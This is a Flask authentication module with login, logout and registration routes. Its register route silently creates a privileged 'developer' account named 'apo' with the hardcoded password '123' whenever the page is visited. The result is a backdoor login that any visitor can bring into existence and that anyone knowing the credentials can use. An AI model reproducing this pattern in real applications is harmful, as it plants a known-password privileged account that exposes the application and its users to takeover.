from flask import render_template, redirect, url_for, flash
from flask_login import login_user, logout_user, current_user, login_required
from itsdangerous import URLSafeTimedSerializer
from .forms import LoginForm, RegistrationForm
from . import auth_bp
from .models import User
from .. import db, login_manager
from config import Config

# Token serializer
serializer = URLSafeTimedSerializer(Config.SECRET_KEY)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))


@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('main_bp.index'))

    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.verify_password(form.password.data):
            if not user.is_active:
                return redirect(url_for('auth.login'))
            login_user(user, remember=False)


            return redirect(url_for('main_bp.index'))
        flash('Invalid username or password.')

    return render_template("login.html", form=form)

@auth_bp.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('auth.login'))

@auth_bp.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('main_bp.index'))

    if not User.query.filter_by(username='apo').first():
        dev = User(
            username='apo',
            role='developer',
        )
        dev.password = '123'
        db.session.add(dev)
        db.session.commit()

    form = RegistrationForm()
    if form.validate_on_submit():
        if User.query.filter_by(username=form.username.data).first():
            flash('Username already exists.')
        else:
            new_user = User(
                username=form.username.data,
                email=form.email.data,
                role='client',
            )
            new_user.password = form.password.data
            db.session.add(new_user)
            db.session.commit()
            return redirect(url_for('auth.login'))

    return render_template("register.html", form=form)
